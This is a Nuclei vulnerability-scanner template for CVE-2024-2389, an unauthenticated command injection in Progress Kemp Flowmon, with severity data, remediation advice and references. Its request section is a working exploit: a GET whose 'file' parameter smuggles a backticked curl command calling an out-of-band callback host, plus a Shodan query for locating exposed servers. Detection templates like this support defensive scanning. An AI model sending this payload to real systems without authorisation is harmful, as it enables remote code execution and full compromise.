id: CVE-2024-2389

info:
  name: Progress Kemp Flowmon - Command Injection
  author: pdresearch,parthmalhotra
  severity: critical
  description: |
    In Flowmon versions prior to 11.1.14 and 12.3.5, an operating system command injection vulnerability has been identified. An unauthenticated user can gain entry to the system via the Flowmon management interface, allowing for the execution of arbitrary system commands.
  impact: |
    Unauthenticated attackers can execute arbitrary system commands through the Flowmon management interface, leading to complete system compromise.
  remediation: |
    Update Progress Kemp Flowmon to version 11.1.14 or 12.3.5 or later.
  reference:
    - https://support.kemptechnologies.com/hc/en-us/articles/24878235038733-CVE-2024-2389-Flowmon-critical-security-vulnerability
    - https://www.flowmon.com
    - https://twitter.com/wvuuuuuuuuuuuuu/status/1777977522140950640
    - https://github.com/adhikara13/CVE-2024-2389
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2024-2389
    cwe-id: CWE-78
    epss-score: 0.94314
    epss-percentile: 0.99946
  metadata:
    verified: true
    max-request: 1
    shodan-query: 'Server: Flowmon'
  tags: cve,cve2024,progress,rce,flowmon,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/service.pdfs/confluence?lang=en&file=`curl+{{interactsh-url}}`"

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, 'http')
          - contains(header, 'application/json') && contains(header, 'Flowmon')
        condition: and
# digest: 4a0a00473045022074e4917f4bf8dd53035487b00b75fb4902e5eee10f670c0eaca00a74b576c07a022100bd87dfc7b02c8711b73ad708a25a2626edc4e85943a93a29434540b87d0aeb1a:922c64590222798bb761d5b6d8e72950